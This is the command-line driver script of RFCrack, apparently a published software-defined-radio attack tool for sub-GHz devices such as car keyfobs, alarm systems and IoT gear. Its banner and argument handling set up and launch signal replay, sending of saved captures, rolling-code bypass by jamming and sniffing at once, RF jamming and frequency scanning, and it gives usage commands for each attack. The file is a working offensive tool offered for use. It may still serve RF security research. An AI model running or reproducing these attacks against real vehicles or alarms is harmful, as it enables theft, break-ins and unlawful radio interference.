
from rflib import *
import src.RFFunctions as tools
import re, time, argparse, textwrap
import src.jam as jam
import src.findDevices as findDevices
import src.attacks as attacks
import src.RFSettings as RFSettings
import sys

sys.dont_write_bytecode = True
parser = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''\

                ___                  _        ___            _
  / __|___ _ _  ___ ___| |___   / __|_____ __ _| |__  ___ _  _ ___
 | (__/ _ \ ' \(_-</ _ \ / -_) | (__/ _ \ V  V / '_ \/ _ \ || (_-<
  \___\___/_||_/__/\___/_\___|  \___\___/\_/\_/|_.__/\___/\_, /__/
                                                          |__/
            ___ ___ ___             _
      ___  | _ \ __/ __|_ _ __ _ __| |__
     |___| |   / _| (__| '_/ _` / _| / /
           |_|_\_| \___|_| \__,_\__|_\_\


    Welcome to RFCrack - A Software Defined Radio Attack Tool

    Developer: @Ficti0n - CCLabs.io / ConsoleCowboys.com
    Blog: console-cowboys.blogspot.com
    YouTube Tutorial: https://www.youtube.com/watch?v=H7-g15YZBiI
    Release: 1.0


    RFCrack is my personal RF test bench, it was developed for testing RF communications
    between any physical device that communicates over sub Ghz frequencies. IoT devices,
    Cars, Alarm Systems etc... Testing was done with the Yardstick One on OSX, but
    RFCrack should work fine in linux. Support for other RF related testing will be
    added as needed in my testing. I am currently researching keyless Entry bypasses.
    Keyless entry functionality will be added in the future with additional hardware
    requirements for advanced attacks.

    Feel free to use this software as is for personal use only. Do not use this code
    in other projects or in commercial products. I hold no liability for your actions
    with this code. Your life choices are your own.


    Current supported Functionality:
    --------------------------------
    - Replay attacks -i -F
    - Send Saved Payloads -s -u
    - Rolling code bypass attacks -r -F -M
    - Targeted -t -F
    - Jamming -j -F
    - Scanning incrementally through frequencies -b -v -F
    - Scanning common frequencies -k

    Future Functionality(Currently Researching)
    -------------------------------------------
    - Keyless Entry/EngineStart bypass with SDR
    - Any Suggestions based on realistic use-cases you want me to add??
    - Add in more configuration for changing timing and logging


    Usage Examples:
    ---------------
    Live Replay:         python RFCrack.py -i
    Rolling Code:        python RFCrack.py -r -M MOD_2FSK -F 314350000
    Adjust RSSI Range:   python RFCrack.py -r -U "-75" -L "-5" -M MOD_2FSK -F 314350000
    Jamming:             python RFCrack.py -j -F 314000000
    Scan common freq:    python RFCrack.py -k
    Scan with your list: python RFCrack.py -k -f 433000000 314000000 390000000
    Incremental Scan:    python RFCrack.py -b -v 5000000
    Send Saved Payload:: python RFCrack.py -s -u ./files/test.cap -F 315000000 -M MOD_ASK_OOK

    Useful arguments:
    ------------------------
    -M Change modulation, usually MOD_2FSK or MOD_ASK_OOK
    -F Change the frequency used in attacks
    -U upper_rssi signal strength value for rolling Code
    -L lower.rssi signal strength value for rolling code
    -S Change Channel Spacing
    -a Jamming frequency variance from sniffer
    -s Send packet from a file source

    Other Notes:
    ------------------------
    Captures get saved to ./files directory by default!

    Rolling code is hit or miss due to its nature with jamming and sniffing at the same time,
    but it works. Just use the keyfob near the yardsticks. It will also require 2 yardsticks,
    one for sniffing while the other one is jamming.

    And a final note, this is my own test bench for doing research and dev, if you have ideas
    to make it better based on realistic use case scenarios, feel free to reach out to me.
    Right now I am working on keyless entry attacks which I will implement into this later.

       '''))

parser.add_argument("-s", "--send", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-i", "--instant_replay", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-r", "--rolling_code", default= False, action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-t", "--targeted_attack", help=argparse.SUPPRESS)
parser.add_argument("-j", "--jammer", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-b", "--brute_scanner",action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-k", "--known_scanner",action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-v", "--increment_value", help=argparse.SUPPRESS ,type=int)
parser.add_argument('-u', "--uploaded_payload",  help=argparse.SUPPRESS)
parser.add_argument('-f', "--freq_list",nargs='+', type=int, default=[315000000, 433000000], help=argparse.SUPPRESS)
parser.add_argument('-a', "--jamming_variance", default=80000, help=argparse.SUPPRESS, type=int)
parser.add_argument('-B', "--baud_rate", default=4800, help=argparse.SUPPRESS, type=int)
parser.add_argument('-U', "--upper_rssi", default=-100, help=argparse.SUPPRESS, type=int)
parser.add_argument('-L', "--lower_rssi", default=-20, help=argparse.SUPPRESS, type=int)
parser.add_argument("-F", "--frequency",default=315000000, help=argparse.SUPPRESS, type=int)
parser.add_argument('-C', "--channel_bandwidth", default=60000, help=argparse.SUPPRESS, type=int)
parser.add_argument("-M", "--modulation_type",default="MOD_ASK_OOK", help=argparse.SUPPRESS)
parser.add_argument("-S", "--channel_spacing",default=24000, help=argparse.SUPPRESS,type=int)
parser.add_argument('-d', "--debug",action='store_true',  help=argparse.SUPPRESS)


args = parser.parse_args()
rf_settings = RFSettings.RFSettings(args.frequency, args.baud_rate, args.channel_bandwidth, args.modulation_type, args.upper_rssi, args.lower_rssi, args.channel_spacing)


if not args.jammer:
    d = RfCat(idx=0)
    d.setFreq(int(rf_settings.frequency))
    d.setMdmDRate(rf_settings.baud_rate)
    d.setMaxPower()
    d.setMdmChanSpc(rf_settings.channel_spacing)
    d.setMdmChanBW(rf_settings.channel_bandwidth)
    d.setMdmSyncMode(0)
    d.setChannel(0)
    d.lowball(1)
    if rf_settings.modulation_type == "MOD_ASK_OOK":
        d.setMdmModulation(MOD_ASK_OOK)
    elif rf_settings.modulation_type == "MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)


if args.rolling_code:
    print("Don't forget to change the default frequency and modulation type")
    attacks.rollingCode(d, rf_settings, args.rolling_code, args.jamming_variance)

if args.known_scanner:
    print("For a custom list use the -z option in the format -f 433000000 314000000 390000000")
    findDevices.searchKnownFreqs(d, args.freq_list)

if args.brute_scanner:
    if args.increment_value == None:
        print("Bruteforcing requires -v argument for an incrementing inteval value Example: 500000")
    else:
        findDevices.bruteForceFreq(d, rf_settings, args.increment_value)

if args.jammer:
    j = jam.setupJammer(0, rf_settings)
    jam.jamming(j, "start", rf_settings, args.rolling_code)

if args.instant_replay:
    attacks.replayLiveCapture(d, args.rolling_code, rf_settings)

if args.send:
    if args.uploaded_payload == None:
        print("Send requires -u argument for an upload file path  Example: ./files/payload.cap")
    else:
        attacks.replaySavedCapture(d, args.uploaded_payload)

if args.debug:
    capture, signal_strength = tools.capturePayload(d, args.rolling_code)
